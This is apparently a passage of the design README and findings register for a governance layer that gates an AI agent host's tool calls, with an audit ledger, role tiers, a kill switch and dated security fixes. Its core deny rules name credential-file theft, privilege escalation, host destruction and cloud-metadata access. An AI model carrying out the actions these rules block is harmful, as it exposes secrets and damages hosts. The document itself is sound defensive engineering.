...
> **Checked against the code on 2026-09-14.** Everything above §"QA findings"
> describes the product as it stands, section by section, naming the module or
> route that does each thing. Everything from §"QA findings" down is the dated
> engineering record and is kept as it was written, so a command or a count
> inside it belongs to its date: the command line it often mentions was removed
> on 2026-09-07. The index of every finding, 1 to 379, is at the end of the
> file, in §"Where this register stops". **Re-derive a count before quoting it**;
> `docs-notes/WRITING-GUIDE.md` lists the command for each.
...
The first run can take several minutes to compile; later runs are fast. The
script is for a Windows development machine: on a Linux server follow
`docs-notes/FIRST-RUN.md`, then `docs-notes/LINUX-INSTALL.md`, and reach the
...
2. Open **Settings → Governance** (`/settings/governance`).
3. The first visit offers to create the **Root** account. After that, sign in
   with those credentials. **An installation is claimed once**: that form
   creates the one organisation's Root, and `bootstrap-root` answers 409 once
   the organisation exists, so claim a new installation before anybody else
   can reach it (`mg/HANDOFF.md` §7, caveat 2).

### The two surfaces, and the one command that remains

**There is no governance command line.** It was removed on 2026-09-07: no
design requirement asked for it, and it was the surface that broke in front of
an operator. Everything the layer does is administered from the dashboard, and
from the HTTP control plane under `/control-ui/governance/` that the dashboard is
built on, which sits behind the Gateway credential and a named-account session
of its own. The removed surface's source, its tests and a restore procedure are
in `old-docs/removed-cli-surface/`. **A document telling you to run
`openclaw governance …` is out of date.**

One capability was rebuilt rather than archived, because requirement 8's
tamper-evidence needs a reader that is not the system being audited:

```bash
node scripts/verify-ledger.mjs
```

It verifies the audit chain from outside the product, with no build, no server
and no sign-in. Exit `0` is intact, `1` is broken, and `2` is _could not check_,
which is not a pass (T62; §2).

**Deleting the organisation**, which this block used to end on, is Root's
_Organisation_ section. It asks for the Root username typed out, deletes every
account in the organisation including Root and every agent it holds, from
OpenClaw as well as from governance, and keeps the audit ledger; §3c explains
why.
...
| The control surfaces: `process`, `computer`, `mobile_ui`, `screen`, `browser`, `nodes`, `gateway`, `automations`, `sessions_spawn`, `subagents`, `code_execution` | `command`     | -      | the action name, plus the text-bearing parameters each tool's own schema carries (findings 71–73) |

**Eighteen of the host's fifty-two catalogued tools are governed, and the other
thirty-four each carry a written reason** in `DELIBERATELY_UNGOVERNED`.
`GOVERNED_TOOLS` in `resource-extraction.ts` holds twenty-two names, because four
governed tools, `bash`, `grep`, `find` and `ls`, sit in the session tool barrel
rather than the catalogue, so the same count reads twenty-two of fifty-six; both
framings are consistent (18 + 34 = 52, 22 + 34 = 56), measured 2026-09-14, and the
documents use the catalogue one. `src/governance/qa-round11.test.ts` fails if the
host gains a tool that is neither governed nor declined with a reason. A call to a
tool with no extractor is recorded `ungoverned` in the ledger and allowed, so a gap
in coverage shows in the trail instead of breaking the agent.
...
**Evaluation order**, which is the whole design (`evaluateGovernancePolicy` in
`policy-engine.ts`, read in order on 2026-09-14):

1. **Registration**. The agent's organisation is resolved from the registry. An
   agent with no record has no rulebook and is refused, and the refusal is
   written to the installation's own trail (`agent-not-registered`, M5).
2. **Posture `off`**. The gate is not running for this call and records
   nothing. Only the installation-wide posture can be `off`; see below.
3. **Kill switch**. A locked agent is refused, whatever any rule says and in
   `monitor` too, and so is anything a locked agent started (T6). Lineage that
   cannot be read while an agent is locked is refused as unproven.
4. **Runtime**. On the native Codex harness, an agent not permitted onto that
   backend is refused, because denied search results cannot be withheld there
   (T7).
5. **Coverage**. A tool with no extractor is recorded `ungoverned` and allowed.
6. **Denials**. Every deny rule at every tier, checked before allowances, so no
   later grant can reopen one, and so `monitor` cannot suspend them.
7. **Allowances**. Baseline, admin, and any operator rule. Under `monitor`, a
   resource no allowance matches is recorded with the decision the policy
   reached, and then allowed.
8. **Default**. Deny outright (`ask: off`), or escalate to a human
...
are accepted by `POST policy/rules` and by the Policy section's authoring form.
...
Posture: `enforce` (live), `monitor` (the decision is recorded and a missing
allowance is not acted on; registration, the kill switch and every denial still
refuse), `off`. Monitor is **opt-in and per agent**, a tool for discovering rules
by watching one agent while the rest of the installation keeps enforcing. **An
Administrator or Root sets it** (`POST policy/agent-mode`, floor Administrator
since T4), from the Policy section's **Observe one agent** control or the
**Observe** button on a live session. A User asks for it instead, from _Rule
requests_, **Request a change for one agent** (A11, 2026-09-13), and an
Administrator decides.

A per-agent posture may be `enforce` or `monitor` only. **`off` is refused at
every tier**, including Root, and on every path that can set it: `policy/agent-mode`,
an agent-setting request at submission and again at approval before the decision
is claimed, and `setAgentMode` itself (`PER_AGENT_OFF_REFUSED`). It is not a
weaker posture but the absence of the gate: the engine returns at step 2 above,
before the lockdown check, so that agent would stop being covered by the kill
switch and the core denials as well as by ordinary rules, and nothing would be
written to the ledger to say so. **Finding 365 was that door found open one route
over** (2026-09-13): an approved request for `off` answered 200 and was recorded
in the ledger as applied, and the loader, which keeps only `enforce` and
`monitor`, discarded it. Switching the gate off remains available to an
Administrator via `policy/mode`, where it is one visible, audited,
installation-wide act.

### 2. Tamper-evident audit ledger

`src/governance/audit-ledger.ts` → `<governance directory>/groups/<groupId>/audit-ledger.jsonl`,
one chain per organisation (M5). The governance directory is
`~/.openclaw/governance` unless `OPENCLAW_GOVERNANCE_DIR` relocates it. The
signing key (`ledger.key`) and the checkpoint (`ledger-checkpoint.json`) sit at
its root and are shared across the installation on purpose, so the
tamper-evidence claim is the same claim for every organisation.
...
at all, such as a test or an administrative action. Nothing is gated on it. It is redacted and clamped like any other recorded text, and it is **masked
...
posture, account and role changes, deciding a rule request, answering an
escalation (T68, `governance.agent.approval-answer`), and kill-switch
lock/release all carry a real `actor` field: `recordAdminAction`, at 44 call
sites outside tests (counted 2026-09-14). Attribution is enforced by the
compiler, `actor` is a required argument on every mutating store function, and
`updatePolicy`, the one route to an unaudited change, is imported by no HTTP
route. An audit trail of agent behaviour without a matching trail of the policy
...
**Two readers verify it, and one of them is outside the product.** The _Audit
ledger_ section's **Verify** (`POST ledger/verify`, floor Viewer) recomputes the
chain on the server and shows its evidence, the chain head, the checkpoint that
agrees with it and whether the entries are keyed, because a bare "intact" had to
be taken on trust (finding 268). The same row prints `node scripts/verify-ledger.mjs`,
which re-implements the hashing, imports nothing from `src/`, and needs no build,
server or sign-in, so it still answers when everything else is broken (T62;
audited 2026-09-07, findings 286 and 287). Compare the two chain heads: a
...
`src/governance/policy-projection.ts`, on both surfaces.
...
| Question                          | Dashboard                            | Route                    |
| --------------------------------- | ------------------------------------ | ------------------------ |
| What may this agent do?           | The _Agent permissions_ section      | `GET policy/by-agent`    |
| Which agents does this rule bind? | "Who does this affect?" on each rule | `GET policy/rule-agents` |
...
> a group around it. **A shipped installation holds one organisation**
> (2026-08-30): `bootstrap-root` answers 409 once it exists. Since T49 (decided
> 2026-09-15, option b) **one organisation per installation is the boundary**: nothing
> is claimed about separation between organisations that exist at once, which only the
> test suites exercise. The group structure stays because it does real work with one
> organisation too: it keeps a deleted organisation's retained audit ledger apart from
> its successor, refuses an agent id with no registration record, and is how the cap
> itself is enforced (`docs-notes/CHAPTER3-MATERIAL.md` §3.5.89; `mg/HANDOFF.md` §7,
> caveat 11).
>
...
> new scope; with one organisation per installation it is one Root per
> installation again.
>
> **Accounts written before groups existed cannot sign in**: `authenticate`
> refuses an account with no group, and the refusal reads as an ordinary failed
> sign-in. **Nothing removes them now.** `governance groups migrate --delete` did,
> and it went with the command line on 2026-09-07; `deleteUnmigratedAccounts` has
> had no caller since. Only an installation that held accounts before M3 can have
> one. _(Until 2026-09-14 this said the **Accounts** panel removes them. It does
> not.)_
>
...
| Role              | Governs                 | Can do                                                                                                                                                                                                                                                 |
| ----------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Root**          | People                  | Accounts and roles, who answers for whom, withholding a User's policy authoring, the per-account escalation override, switching a core rule off or back on, the Codex backend, the deployment report, deleting the organisation, plus everything below |
| **Administrator** | All agents              | Installation-wide posture and escalation, global rules, any agent's rules, posture and escalation, registering and provisioning the agents they own, assigning agents to accounts, deciding rule requests, plus everything below                       |
| **User**          | Their assigned agent(s) | Prompt it and attach files, cancel their own prompts, write and remove its rules (unless Root withholds that), stop and release it, answer its escalations, set its approval timeout, read its logs unmasked, request anything beyond scope            |
| **Viewer**        | Their assigned agent(s) | Read-only: its policy and posture, its live runs, its ledger with resource details masked, the rule-request queue for its agents, system resource states                                                                                               |

Checked row by row against `docs-notes/ROLE-MODEL.md` §2 on 2026-09-14, which
names the route and the check behind each capability.
...
`src/gateway/governance-dashboard-agents.ts`; the dashboard's _Agents in your
organisation_ section.
...
having one, and what M6's provisioning produces. The reconstruction holds
...
not registered at all is refused too, since M5** (`assertAssignable`,
`AgentNotAssignableError`). It was assignable under M4, and that let the
ownership rule be sidestepped by never registering; once M5 made registration
mandatory at the gate, an unregistered agent could not act at all, so assigning
one would hand somebody a thing that does nothing.
...
**Registering does not create an agent in OpenClaw; provisioning does** (M6,
`POST agents/provision`), and it is a change of kind rather than degree: the
first place this layer mutates the host it governs. Registering an id the host
already runs (`POST agents/register`) is how an existing installation claims its
agents. **Deleting an agent from the host** (`POST agents/deprovision`) also
clears everything its id carried in governance, its rules, posture, escalation
override, approval timeout and lockdown, so a later agent registered under the
same id inherits none of it (T55, decided by Mohammad on 2026-09-08; finding
324 found that an id carries five things, not three). **A question asked about
the deleted agent cannot then be answered yes**, whether or not a new agent is
registered under the name: a rule or agent-setting request is refused at
approval with 409 `agent_not_registered` before the decision is claimed, and its
queue row says the agent is gone and offers only Reject (findings 366 and 370);
a dashboard escalation raised before the agent's current registration is not
listed and cannot be answered; and a held decision asked before it cannot be
allowed, though a denial still clears it (finding 370). The rule is one test,
`registrationPredates` in `agent-registry.ts`: the registration now under the id
must be older than the question.

**Two ways to delete from the host, chosen every time (C13, decided and built
2026-09-15).** The route requires `hostDeletion` whenever `deleteFromHost` is set, and
the dashboard asks in a window that explains both, neither pre-selected. **`roster`**,
_delete from OpenClaw's agent list only_, removes the agent's configuration entry and
nothing else: its workspace and session files, session database, scheduled jobs, host
exec approvals and governance's dashboard conversations with it stay, and a new agent
provisioned under the name inherits them (finding 372), so provisioning then returns
`hostLeftovers` and the dashboard names what was inherited. **`full`**, _delete the way
OpenClaw does_, runs OpenClaw's own `agents.delete` in-process through a seam the
Gateway installs (`registerHostAgentDeleter` in `agent-host-deletion.ts`, installed by
`governance-host-agent-deletion.ts`): its deletion journal and file fences, the
scheduled-job and approval removal, the session purge, and the move of the workspace,
agent folder and session files to `.Trash` in the Gateway account's home folder. It also
removes governance's dashboard conversations with the agent and its unsent attachments,
keeping those a ledger entry names. It is refused before anything changes with no
running Gateway, while the agent has a dashboard prompt or a live session, when a folder
it would move contains the governance directory (finding 254's layout), and on
OpenClaw's own refusals, its configuration-file guard included; each refusal carries a
remedy the dashboard shows (finding 374). Neither delete touches the audit ledger, and
the deletion's entry says which ran, in counts. `mg/REMAINING-WORK.md` §"C13 decided"
has the record.

### 3c. Deleting the organisation (2026-09-01)

`src/governance/organisation-deletion.ts`, with the domain rule in
`account-guards.ts` (`guardOrganisationDeletion`), the route
(`POST organisation/delete`) in `governance-dashboard-accounts.ts`, and the
_Organisation_ section in `ui/src/pages/governance/panels/organisation-panel.ts`.
...
unrecoverable installation. Hence a separate route, a separate panel, and a
confirmation that is the Root username typed out and compared **on the server**,
so no client, whatever it sends, decides what counts as consent.

**Order: agents, then accounts, then storage.** Deleting an agent from the host,
in whichever of C13's two ways Root chose once for every agent, is the step that can fail. Doing it while Root still exists means a failure
...
at all. The count is reported by the route and the panel (`attachmentsRetained`), for
...
**The dashboard says what survived (finding 212).** Organisation deletion has
always reported `audit ledger kept at <path>`; the panel used to print only the
counts, so the operator who used the dashboard was the one who could not learn
that anything was retained.
...
Covered by `src/governance/organisation-deletion.test.ts` (15),
`src/gateway/governance-organisation-delete.test.ts` (7), the four cases in the
organisation panel's block of `ui/src/pages/governance/governance-panels.test.ts`,
and `src/governance/organisation-deletion-evidence.test.ts` (3, added 2026-09-02
for finding 211. The retention case was verified to fail against the unfixed
code, and the two beside it keep the fix from becoming "retain everything").
Counted 2026-09-14; the command-line tests went with the command line.
...
**It reaches a dashboard prompt as well (finding 364, security, 2026-09-13).**
Prompts sent from the governance page run in `prompt-runs.ts`, not in the
Gateway's run registry that termination read, so a lockdown stopped every chat
run and left a dashboard prompt running, with its escalation still answerable:
"Allow once" could run an action on a locked agent. `terminateAgentRuns`
(`agent-terminator.ts`) now ends the agent's prompt runs first, with the ending
`kill-switch`, and counts the stop confirmed only once they have unwound
(`promptRunsStillExecuting`). Ending the prompt withdraws its escalation, and
`POST approvals/decide` refuses anything but a denial for a locked agent.

**On the dashboard, Lock down asks first and names the agent** (2026-09-13), as
Stop in _Active agent sessions_ always did: the kill switch's agent field is
typed, and a mistyped id locks the wrong agent. Found closing the independent
review.

_(Until 2026-09-07 the command line could lock an agent but not end its runs,
because the run registry lives in the Gateway process; it said so. That surface
is gone.)_
...
so the route and the dashboard both say _"the agent IS stopped, and this stop is
missing from the ledger"_.
...
often (finding 174), and this was its fifth instance. The command was repaired
that day and removed with the command line on 2026-09-07, so the route's four
checks are now the only ones.
...
**On the dashboard this is _Your agents_** (Settings → Governance): one
conversation per agent and account, with attachments (§4d). **A task survives
its tab** (T63; Kinan's decision, 2026-09-12): closing or reloading the page
does not cancel it. It stays listed, with its **Cancel**, on any tab of the
account that sent it and in _Active agent sessions_, and its reply lands in the
conversation when the run finishes. What bounds a task is the five-minute
timeout, six prompts running at once across the installation and two per
account (`prompt-runs.ts`), and Cancel, which a User has for their own prompts
and an Administrator or Root for any prompt in the organisation.

**An escalation raised by one of these runs is answered on the governance page**
(T68, 2026-09-13), by the accounts that manage the agent: its assigned Users, the
organisation's Administrators and Root. Both Gateway approval gates refuse it to
every connection except the approval runtime and the run that raised it, admin
scope included, and the answer is recorded under the account that gave it. A
task cancelled while its card is up withdraws the card (T69, finding 363,
`plugin.approval.withdraw`). An escalation from a **chat** run is different: it is
still answered in the Control UI by whoever holds the Gateway credential
(`mg/HANDOFF.md` §7, caveat 27).

_(Until 2026-09-07 the conversation was also reachable from the terminal, as
`governance agent prompt` and `transcript`, which showed one person the same
thread (T5, finding 219), with a prompt from a terminal that had no login
recorded against `cli`. That surface is gone.)_

Known limits, stated rather than hidden: no streaming (the reply arrives when
the run finishes), and the transcript file is a bounded convenience, 200 turns
per conversation and 200 conversations. The ledger is the authoritative record.
...
| **User**          | No          | **Yes**, add, forbid, remove | **No, may _request_ it** (T4, A11) | No                   | No                   |
...
capability is **relocated rather than removed**: a User files an `agent-setting`
request, from _Rule requests_, **Request a change for one agent** (A11,
2026-09-13; until then only through the API), and an Administrator approves or
rejects it, so the act still happens and is decided by somebody who could have
done it directly. A path request also states its direction, read or write,
because approving grants exactly what was asked (A11).

**An Administrator sets these directly**, on the Policy section: posture with _Observe
one agent_, and escalation with _Escalation for one agent_, which picks one of the agents
the account manages and sets it to **Ask a human** or **Deny** (sweep task A12, built
2026-09-14). **Use default** on the agent's override row clears either. The two rows are
gated together and hidden below Administrator; a User is shown the pointer to _Request a
change for one agent_ in their place. _(Until A12, escalation had no direct control: the
only dashboard call to `setAgentAsk` passed `null`, so an Administrator could clear an
override from the page and could set one only through an approved request or
`POST policy/agent-ask`.)_
...
misread.** The ten **core** rules are _denials_ and form the security floor;
...
Counted from `baseline-policy.ts` on 2026-09-14; `docs-notes/BASELINE-RULES.md`
has every rule and its reason.

**Since T24, Root may switch off five of the ten core rules**: credential files,
credential directories, privilege escalation, host destruction, and cloud
instance metadata. **Five cannot be switched off by anyone** (`selfProtecting`):
the governance layer's own policy, accounts, ledger and signing key; the
governance directory in use; any command naming the governance state directory;
any command naming the governance directory in use; and the governance command
line's own verbs (`governance policy|agent|kill|ledger|…`), which could switch
the gate off. Those five are what stop a governed agent reaching the policy, the
accounts, the ledger, the signing key or an off switch. Lift them and every
other control, including the record of which rules are disabled, becomes
advisory.

Nothing is deleted by switching a rule off: it stays declared in
`baseline-policy.ts`, is rebuilt on every load, and returns when switched back
on. And a lowered floor cannot hide. The change is its own audit entry naming
the rule, and the _Deployment and network posture_ report counts the
installation as **failing** while any core rule is off.

**Both directions are on the Policy section, for Root** (`POST
policy/core-rules`). A switched-off rule stays on the page, named for every tier
and with **Switch on** for Root. That became true only on 2026-09-14 (finding
367): the policy read had carried nothing but the rule's id, so a shipped denial
switched off from the page could be restored only by hand-written HTTP, while
the deployment report's remedy told Root to switch it back on there.
...
_(The command line had its own login, T5, which recorded changes against the
signed-in account and tier. It went with the command line on 2026-09-07.)_
...
to add, remove or narrow a rule, which is exactly the power the paper's narrower
User tier did not have.

Set it from the _Accounts_ section (`POST users/policy-authoring`, Root only).
The session mirrors the flag, so it takes effect without the User signing out
(finding 209).
...
**Still unproven on a live model run.** The terminator behind the seam in these
tests is a test double. T2 (2026-09-06) demonstrated the gate refusing a real
model's tool call on the VPS, and did not exercise the stop; finding 364's probe
drove the Gateway's real terminator against a dashboard prompt run, with no model
deciding anything. The by-hand test plan (`docs-notes/T47-TEST-PLAN.md`) drives
the stop on a real screen.

### 4d. Attachments (T14)

`src/governance/attachment-store.ts`. An operator sends files with a prompt from
the conversation in _Your agents_: `POST agent/attachment` stores one and returns
its SHA-256, a prompt names up to ten by hash (`POST agent/prompt`), and
`POST agent/attachment/release` removes one that was never sent. _(Until
2026-09-07 the command line could attach one too.)_
...
The _Deployment and network posture_ report carries a row for them: attachment
count, total size, any files on disk that nothing references, and, since finding
194, an explicit **fail** when the index cannot be read at all, because a Root-only diagnostic that throws on
...
is a dashboard action rather than something only the API can express, and since
A12 (2026-09-14) its escalation twin, **Escalation for one agent**, which sets one
agent to **Ask a human** or **Deny**; the two rows share one gate. Design
...
deciding whether to intervene. **Setting a posture is Administrator-level** (T4):
the policy panel's control appears from Administrator up, and a Viewer sees the
status and no button. **So does the live-session row's, since finding 369**
(2026-09-14): it had been drawn for a User on their own agents, and the route
refused every press; found while checking this section against the code. Neither
control offers
`off`, because the server refuses it at every tier and a button that can only
produce an error is worse than none.

A clash caused by a deny rule is headed differently from one caused by an
earlier allowance, because the two mean opposite things: one says the new rule
adds nothing, the other says it does nothing at all; and a rule that makes an
identical temporary rule permanent is headed as the extension it is (bug 8,
2026-09-13). Destructive actions confirm first, including the role selector,
which used to apply the instant it was clicked, and the kill switch's Lock down.
The audit view filters between agent activity and policy changes, since
administrative entries are a small minority in a busy ledger and "who changed
this rule?" otherwise means scrolling past thousands of tool calls. The page
refreshes every 15 seconds and clears itself when the session expires, rather
than leaving stale data on screen as though it were current.

**What is on the page, as of 2026-09-14.** Fourteen sections, each shown only to
the tiers its routes serve: _Identity_, _Policy_, _Agent permissions_, _Rule
requests_, _Accounts_, _Organisation_, _Agents in your organisation_, _Your
agents_, _Active agent sessions_, _Emergency kill switch_, _Audit ledger_,
_System resources_, _Deployment and network posture_, and _Awaiting your
decision_, which appears only when an escalation has timed out into it (T56 bounds
it and reports what it shed). **Above them, _Waiting for your answer_** carries a
dashboard prompt's escalations to the accounts that manage the agent, polled every
two seconds (T68). All fourteen were driven from all four tiers by 2026-09-08 and
through a browser under failure on 2026-09-12 and 13
(`mg/REMAINING-WORK-DASHBOARD-SWEEP.md`).

**The Control UI's service worker caches build assets only** (`ui/public/sw.js`,
finding 346, security). It had stored every governance answer and served it,
whenever the Gateway did not answer, to whichever account was signed in; every
live read now stays on the network, and a new worker purges what an earlier one
stored.
...
**Who answers depends on where the run came from** (`mg/HANDOFF.md` §7, caveat
27). A chat run's approval is answered outside the governance tiers, in the
Control UI by whoever holds the Gateway credential or with the channel's own
approval buttons, and is not attributed to a governance account. Only a
dashboard prompt's escalation is limited to the accounts that manage the agent
(T68, §4b).
...
`old-docs/removed-cli-surface/README.md`.)_
...
whether the checkpoint exists, that the gate has not been switched off, and that
every core rule is on) and the stated constraints (Linux target, 8 GB minimum).
Findings from the host's own gateway security audit are folded in verbatim. A
core rule switched off fails the report, and its remedy names the Policy
section, where Root can now switch it back on (finding 367).
...
**On a new host, set the tunnel up first.** The dashboard is meant to be
reachable only through an SSH local port forward, and the moment you most need
to know whether the listener is exposed is before any tunnel exists. Until
2026-09-07 the report could be read then, from a plain SSH session; that surface
is gone, and **that is a real cost of the removal** (`docs-notes/LINUX-INSTALL.md`
§6). What still needs no tunnel is `node scripts/verify-ledger.mjs`.
...
# The four typechecks: core, UI, and the two test trees.
...
# Linting. Plain oxlint is fast and narrow; the GATE runs the type-aware rules,
# scripts/ and the CSS check, and needs its shard cap raised on this machine.
...
# The whole Control UI suite, which the governance command above does not cover.
# Five tests fail under jsdom on Blob.stream(), in files the fork never touched (A10).
node node_modules/vitest/vitest.mjs run --config test/vitest/vitest.ui.config.ts

# The browser project: the only tests that measure layout (needs Playwright's Chromium).
(cd ui && node ../node_modules/vitest/vitest.mjs run --config vitest.config.ts --project browser)

# The audit chain verified from outside the product, and the documents audited
# against the tree (the audit exits 1 whenever it lists advisory items: read its
# finding-count block, not its exit code).
node scripts/verify-ledger.mjs
node docs-notes/qa-sweep-2026-09-08/doc-audit.mjs

# The demonstration sequence, end to end, against real modules on real disk.
# 20 checks; exits non-zero on any failure (20/20 on 2026-09-14).
node --import tsx scripts/governance-demo-rehearsal.mjs
```
...
> 2026-09-02), and the gate is not what enforces anything (finding 237,
> 2026-09-03).**
>
> ```bash
> node node_modules/oxlint/bin/oxlint --config .oxlintrc.json src ui/src   # exit 0, and narrow
> node scripts/run-lint.mjs                                                # exit 0 as of 2026-09-03
> ```
>
> **Current state, 2026-09-14.** The full gate exited 0 with the raised shard cap
> (`OPENCLAW_OXLINT_SHARD_TIMEOUT_MS=2700000`), and so did plain `oxlint` over
> `src` and `ui/src`, both measured before findings 366–368 were fixed; the
> fourteen files those fixes touched then passed plain `oxlint` and
> `oxfmt --check`. The core shard needs about fifteen minutes here against a
> 905-second default cap, so an unraised run can time out, which is exit 124 and
> not a verdict. `git-hooks/pre-commit` runs `oxfmt` and plain `oxlint` over staged
> files and says on every commit that it is not the gate. **Nothing runs the gate
> automatically, and that is decided** (T50, 2026-09-09): there is no CI on this
> repository, and an eighteen-minute hook would be bypassed. Read its exit code,
> never its tail (`mg/HANDOFF.md` §4).
>
> **The state on 2026-09-03, kept as the record.** Finding 221's 38 errors are fixed and
> both oxlint shards exit `0`. `run-lint.mjs` itself **could not finish on
> Windows** until the same day. It spawned stylelint through the extensionless
> `node_modules/.bin` shim, which `spawnSync` cannot execute without a shell, so
> it exited 1 after every shard had passed and its CSS check had never run
> (finding 233). And `git-hooks/pre-commit` **does not run `run-lint.mjs`**: it
> runs `oxfmt --write` and `oxlint --config .oxlintrc.json` over staged files,
> the narrow invocation this box was written to warn about (finding 237). The
> analysis below is the 2026-09-02 measurement that produced 221, kept as the
> record of how the two invocations differ.
>
...
**The governance suite: 3,099 passed, 21 skipped and 0 failed, across 179 files
passed and 2 skipped** (Windows, 2026-09-14, with the work committed that day in
the tree). The harness suites: 263 passed. The whole Control UI suite: 8,202
passed and 5 failed, the five jsdom failures named above. The browser project:
199 passed. Re-measure before quoting any of these; `mg/HANDOFF.md` §1's state
table carries the latest.

_Earlier:_ 2,684 automated tests across 144 file runs (Windows, 2026-09-02, after T44 and the
...
**On Linux, the last full-suite measurement predates T44 (2026-09-02) and is not
current**: the suite ran natively on Ubuntu 24.04 then, and T3 is the Linux
measurement still owed. `scripts/governance-linux-check.mjs` provides a
dependency-free platform harness (file locking, POSIX permissions, path
handling, hashing) for any deployment target, and T2's live refusal on
2026-09-06 ran on the VPS.

**The governance command line was removed on 2026-09-07.** Its specification,
source, tests and a restore procedure are kept in `old-docs/removed-cli-surface/`.
...
`old-docs/UPSTREAM-BUG-REPORT.md` for the full write-up prepared for filing upstream.
...
> `old-docs/qa-round13-probes/` as `.ts.txt` so they do not join the test suite:
...
failures in `old-docs/UPSTREAM-BUG-REPORT.md`, each reported twice because the suite runs
...
a verified patch. Details and the filing link are in `old-docs/UPSTREAM-BUG-REPORT.md`.
...
`old-docs/qa-round16-probes/`. Report material in `CHAPTER3-MATERIAL.md`
...
`old-docs/UPSTREAM-BUG-REPORT.md` was written up on that basis.
...
alone will be **two hundred and forty-two findings short**, 135 through 376,
...
and ninety-one" at 325 and "two hundred and two" at 336 and "two hundred and four" at 338 and "two hundred and seven" at 341 and "two hundred and eleven" at 345 and "two hundred and thirty-four" at 368 and "two hundred and thirty-seven" at 371 and "two hundred and thirty-eight" at 372 and "two hundred and forty" at 374; the number is
...
- `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` §"The dashboard QA pass (2026-09-12 and
  13)": **346**, the Control UI's service worker stored every governance answer
  and served it, whenever the Gateway did not answer, to whichever account was
  signed in. A Viewer was served Root's accounts list, and signing out removed
  nothing. Only content-hashed build assets are cached now.
- Same file, §"Finding 364": **364**, design requirement #7. The kill switch
  never stopped a prompt sent from the dashboard, because those runs are not in
  the Gateway's run registry, and an escalation raised before the lock stayed
  answerable, so "Allow once" could run an action on a locked agent. Lockdown now
  ends the agent's prompts, which withdraws the escalation, and the answer route
  refuses an allow for a locked agent.
- `docs-notes/CHAPTER3-MATERIAL.md` §3.5.90 and §3.5.91: **372 (fixed 2026-09-15)**, finding 256's shape for
  agents. Governance's _delete from host_ removes an agent from OpenClaw's roster and
  leaves its workspace files, session database, scheduled jobs and exec-approval settings,
  all found by name, so a new agent given the name by a different Administrator inherits
  them. Proved on a real OpenClaw state directory on 2026-09-15; the gate still bounds what
  the new agent may do. Decision C13 was taken and built on 2026-09-15: the operator chooses
  between the list-only delete, after which a new agent of the name is told what it
  inherited, and OpenClaw's own delete (§3.5.91).
...
| **216–221**                                  | `REMAINING-WORK.md` §"An eighth 20% segment"; design in §3.5.72; plain language in §5.90. **216 is security**. The transcript command made two of its route's four checks. **217** is the ledger asserting a Codex-backend change that had failed; **218**, **219** and **220** are this file, the CLI reference and the verification baseline describing a system that had moved, 220 including inside finding 204's own write-up, which is the finding _about_ a stale baseline. ~~**221 is open**~~, **fixed the same day; all 38 errors cleared and both shards clean, re-measured green 2026-09-03.** The lasting correction is that every register now names `scripts/run-lint.mjs` rather than the binary                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **222–224**                                  | `REMAINING-WORK.md` §"A capability sweep across surfaces"; design in §3.5.73–74; plain language in §5.91. A **new sampling axis**. Capabilities rather than modules, once the module pool closed. **222**: Root’s per-account escalation override had the route and the dashboard and no command. **223**: the register of deliberate command-line omissions named one exception where there were three. **224**: a performance test asserting "appending does not re-read the whole file" by timing it, which passed when the quadratic implementation was put back                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **225–228**                                  | `REMAINING-WORK.md` §"The tenth sweep. Breaking it on purpose"; design in §3.5.75; plain language in §5.92. A **third axis**: not what is sampled but what counts as evidence. Fifteen deliberate breakages of six security-critical features, **all fifteen caught**. **225 and 226 are security.** **225**: the login throttle’s memory bound could be filled with lockouts on invented usernames, after which a real account’s failure counter was deleted on every attempt. Measured at 500 guesses without a lockout, counter never above 1. Reachable by a caller past the Gateway’s Control-UI gate who holds **no governance account**, which is the population this second gate exists to stop; the residual is structural and recorded in the module. **226**: a failed `governance login` was recorded nowhere, on the surface whose only honest offering is the trail. **227**: four live copies of "the tree is not clean, 56 files uncommitted", a day after the commit that landed them. **228 is this row**, the register in this file stopped at 221, so 222–224 were never entered here and 221 was still marked open in the one document three others recorded as fixed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **229**                                      | `REMAINING-WORK.md` §"The eleventh sweep, the branch that only runs on a bad day"; design in §3.5.76; plain language in §5.93. **A fourth axis: control-flow reachability**. The failure branch of a governed operation, which is the least-executed code in the layer and where findings 195, 156 and 217 already sat. **One defect in three modules.** `deleteOrganisation` guarded everything up to the point of no return and nothing after it: five unguarded awaits, so a corrupt attachment index or a ledger lock timing out threw out of the function and both surfaces reported a **completed, irreversible** deletion as a failure. That is finding 195 one act further up the scale of consequence, and worse, because a kill switch can be re-engaged and an organisation cannot be restored. `deprovisionAgent` had it on its final ledger write, and `setCodexBackendEnabled` had it in the dangerous direction. An **accepted** enforcement gap reported as a refused one. All three now hand the failure back beside the success (`incomplete`, `auditError`), on all three surfaces. **The rule: before the point of no return fail loudly; after it, never throw**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
